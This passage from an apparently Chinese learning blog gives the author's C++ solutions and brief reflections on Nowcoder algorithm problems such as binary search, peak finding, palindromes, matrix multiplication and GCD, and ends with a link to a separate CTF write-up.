<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">maxInWindows</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; num,<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">size</span> &gt; num.<span class="built_in">size</span>() || <span class="built_in">size</span> ==<span class="number">0</span> ) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        <span class="keyword">int</span> sz = num.<span class="built_in">size</span>()-<span class="built_in">size</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span> <span class="params">(sz,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz; ++i) &#123;</span><br><span class="line">            v[i] = num[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; i+<span class="built_in">size</span>; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span>(v[i]&lt;num[j]) v[i] = num[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res = s.maxInWindows(v,<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;res[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NC101-缺失数字"><a href="#NC101-缺失数字" class="headerlink" title="NC101 缺失数字"></a>NC101 缺失数字</h2><blockquote>
<p>暴力循环写的，，，效率不好，，，</p>
<p>其他思路：</p>
<p>1.通过循环求和，最后通过公式n*(n+1)/2-sum，求得少的值</p>
<p>2.循环条件就是a[i]=i，否则就直接返回结课</p>
<p><del>额，不知道为啥效率都挺低的，，，</del></p>
</blockquote>
<h3 id="exp-12"><a href="#exp-12" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="line">     *</span><br><span class="line">     * 找缺失数字</span><br><span class="line">     * @param a int整型vector 给定的数字串</span><br><span class="line">     * @return int整型</span><br><span class="line">     *&#x2F;</span><br><span class="line">    int solve(vector&lt;int&gt;&amp; a) &#123;</span><br><span class="line">        int i&#x3D;0;</span><br><span class="line">        while(i&#x3D;&#x3D;a[i])i++;</span><br><span class="line">        return i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="my-exp-2"><a href="#my-exp-2" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 找缺失数字</span></span><br><span class="line"><span class="comment">     * @param a int整型vector 给定的数字串</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; a)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;a.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]!=i)&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC103-反转字符串"><a href="#NC103-反转字符串" class="headerlink" title="NC103 反转字符串"></a>NC103 反转字符串</h2><blockquote>
<p>自我感觉良好，，，，哈哈哈</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 反转字符串</span></span><br><span class="line"><span class="comment">     * @param str string字符串 </span></span><br><span class="line"><span class="comment">     * @return string字符串</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">solve</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="built_in">string</span> rev;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length();i++)&#123;</span><br><span class="line">            rev = str[i] + rev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> rev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC105-二分查找-II"><a href="#NC105-二分查找-II" class="headerlink" title="NC105 二分查找-II"></a>NC105 二分查找-II</h2><blockquote>
<p>比较简单的题，，，思路我是对的，但是写的不好，，，。</p>
<p>一个点就在于这个排好序的序列里面可能有重复的元素，所以即使找到了，还要判断前面的数是不是还是答案，用循环即可解决。</p>
</blockquote>
<h3 id="exp-13"><a href="#exp-13" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 如果目标值存在返回下标，否则返回 -1</span></span><br><span class="line"><span class="comment">     * @param nums int整型vector </span></span><br><span class="line"><span class="comment">     * @param target int整型 </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r=nums.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> mid=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;=r)&#123;</span><br><span class="line">            mid=(l+r)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid]==target)&#123;</span><br><span class="line">                <span class="keyword">while</span>(nums[mid<span class="number">-1</span>]==nums[mid])&#123;</span><br><span class="line">                    mid--;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums[mid]&gt;target)&#123;</span><br><span class="line">                r=mid<span class="number">-1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l=mid+<span class="number">1</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC107-寻找峰值"><a href="#NC107-寻找峰值" class="headerlink" title="NC107 寻找峰值"></a>NC107 寻找峰值</h2><blockquote>
<p>easy，自己写出来了，虽然有点周折</p>
<p>这里有个有意思的是，其实只要判断后面的比前一个大即可，因为这个条件失败往前走，后面的肯定比前面的小，而最后一个如果是峰值也算，故可行，，，</p>
</blockquote>
<h3 id="my-exp-3"><a href="#my-exp-3" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 寻找最后的山峰</span></span><br><span class="line"><span class="comment">     * @param a int整型一维数组 </span></span><br><span class="line"><span class="comment">     * @param aLen int a数组长度</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> aLen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(a[aLen<span class="number">-1</span>]&gt;a[aLen<span class="number">-2</span>])&#123;<span class="comment">//最后一位是峰值</span></span><br><span class="line">            <span class="keyword">return</span> aLen<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//从后往前找</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=aLen<span class="number">-2</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;a[i<span class="number">-1</span>] &amp;&amp; a[i]&gt;a[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;a[i];</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 寻找最后的山峰</span></span><br><span class="line"><span class="comment">     * @param a int整型一维数组 </span></span><br><span class="line"><span class="comment">     * @param aLen int a数组长度</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> aLen)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(a==<span class="literal">nullptr</span> || aLen==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=aLen<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i]&gt;=a[i<span class="number">-1</span>])&#123;</span><br><span class="line">                <span class="keyword">return</span> i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC141-判断回文"><a href="#NC141-判断回文" class="headerlink" title="NC141 判断回文"></a>NC141 判断回文</h2><blockquote>
<p>emmm，是一道简单题，，，但是我写的麻烦了点，就没有通过，，，，</p>
</blockquote>
<h3 id="my-exp-4"><a href="#my-exp-4" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param str string字符串 待判断的字符串</span></span><br><span class="line"><span class="comment">     * @return bool布尔型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="built_in">string</span> rev;</span><br><span class="line">        <span class="keyword">int</span> len = str.length();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            rev = str[i] + rev;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        str = str.substr(len%<span class="number">2</span>==<span class="number">0</span>?len/<span class="number">2</span>:len/<span class="number">2</span>+<span class="number">1</span>,len);</span><br><span class="line">        <span class="keyword">if</span>(rev == str)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="right-exp"><a href="#right-exp" class="headerlink" title="right exp"></a>right exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">judge</span><span class="params">(<span class="built_in">string</span> str)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;str.length()/<span class="number">2</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(str[i] != str[str.length()<span class="number">-1</span>-i])</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h2 id="NC143-矩阵乘法"><a href="#NC143-矩阵乘法" class="headerlink" title="NC143 矩阵乘法"></a>NC143 矩阵乘法</h2><blockquote>
<p>思路比较简单：三层循环，，，，一个公式就出来了，，，</p>
</blockquote>
<h3 id="二维矩阵初始化"><a href="#二维矩阵初始化" class="headerlink" title="二维矩阵初始化"></a>二维矩阵初始化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">res</span><span class="params">(a.<span class="built_in">size</span>(),<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(a.<span class="built_in">size</span>(),<span class="number">0</span>))</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">        <span class="keyword">int</span> t=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; a.<span class="built_in">size</span>(); ++k) &#123;</span><br><span class="line">            t += a[i][k] * b[k][j];</span><br><span class="line">        &#125;</span><br><span class="line">        res[i][j] = t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">res</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;a,<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;b)</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">res</span><span class="params">(a.<span class="built_in">size</span>(),<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(a.<span class="built_in">size</span>(),<span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">                <span class="keyword">int</span> t=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; a.<span class="built_in">size</span>(); ++k) &#123;</span><br><span class="line">                    t += a[i][k] * b[k][j];</span><br><span class="line">                &#125;</span><br><span class="line">                res[i][j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">2</span>&#125;&#125;;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v2 = &#123;&#123;<span class="number">3</span>,<span class="number">4</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res = s.res(v,v2);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; res[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;res[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        &#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NC151-最大公约数"><a href="#NC151-最大公约数" class="headerlink" title="NC151 最大公约数"></a>NC151 最大公约数</h2><blockquote>
<p>一个常用的求最大公约数的方法，<strong>记住他</strong></p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 求出a、b的最大公约数。</span></span><br><span class="line"><span class="comment">     * @param a int </span></span><br><span class="line"><span class="comment">     * @param b int </span></span><br><span class="line"><span class="comment">     * @return int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(a%b==<span class="number">0</span>)<span class="keyword">return</span> b;</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2021/04/18/牛客网-算法篇/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/03/29/buu每日一题（3）/" >buu每日一题（3）</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-03-29  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><blockquote>
<p>单独写了篇文章，方法是fastbin attack</p>
</blockquote>
<ul>
<li><a href="https://warm-winter.github.io/2021/04/19/0ctf-2017-babyheap/" target="_blank" rel="noopener">0ctf_2017_babyheap详解</a></li>
</ul>
